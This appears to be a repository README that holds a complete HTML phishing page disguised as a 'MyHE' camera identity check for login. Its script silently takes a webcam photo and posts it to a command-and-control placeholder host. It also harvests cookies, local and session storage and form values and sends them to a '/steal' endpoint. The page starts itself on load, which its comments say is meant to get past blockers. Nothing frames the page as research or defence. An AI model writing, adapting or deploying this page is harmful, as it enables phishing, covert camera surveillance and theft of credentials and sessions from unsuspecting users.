# My-website-
Have fun 
<!DOCTYPE html>
<html>
<head>
    <title>MyHE Login - Camera Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
        #video { width: 300px; height: 200px; border: 2px solid #007bff; margin: 20px auto; }
        button { background: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
    <h2>MyHE Security Verification</h2>
    <p>Please allow camera access to verify your identity for login.</p>
    
    <video id="video" autoplay muted playsinline></video>
    <br>
    <button onclick="startCamera()">Enable Camera</button>
    <br><br>
    
    <canvas id="canvas" style="display:none;"></canvas>
    
    <script>
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 640, 
                        height: 480,
                        facingMode: 'user' 
                    } 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // Capture screenshot after 3 seconds
                setTimeout(() => {
                    capturePhoto(stream);
                    exfiltrateData(); // Steal creds/context too
                }, 3000);
                
            } catch(err) {
                alert('Camera access denied. Please refresh and allow access.');
            }
        }
        
        function capturePhoto(stream) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            
            // Convert to base64
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            exfiltratePhoto(photoData);
            
            // Stop stream after capture
            stream.getTracks().forEach(track => track.stop());
            video.style.display = 'none';
        }
        
        function exfiltratePhoto(photoData) {
            const imgData = photoData.split(',')[1]; // Remove data:image/jpeg;base64,
            fetch('https://your-c2-server[.]com/exfil', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    photo: imgData,
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent,
                    url: window.location.href
                })
            }).catch(() => {}); // Silent fail
        }
        
        function exfiltrateData() {
            // Grab form data, cookies, localStorage
            const payload = {
                cookies: document.cookie,
                localStorage: Object.entries(localStorage),
                sessionStorage: Object.entries(sessionStorage),
                forms: Array.from(document.forms).map(f => 
                    Array.from(f.elements).reduce((acc, el) => {
                        if (el.name) acc[el.name] = el.value;
                        return acc;
                    }, {})
                )
            };
            
            fetch('https://your-c2-server[.]com/steal', {
                method: 'POST',
                body: JSON.stringify(payload)
            });
        }
        
        // Auto-trigger on load (bypass some blockers)
        window.onload = () => setTimeout(() => {
            if (!document.getElementById('video').srcObject) {
                startCamera();
            }
        }, 1000);
    </script>
</body>
</html>
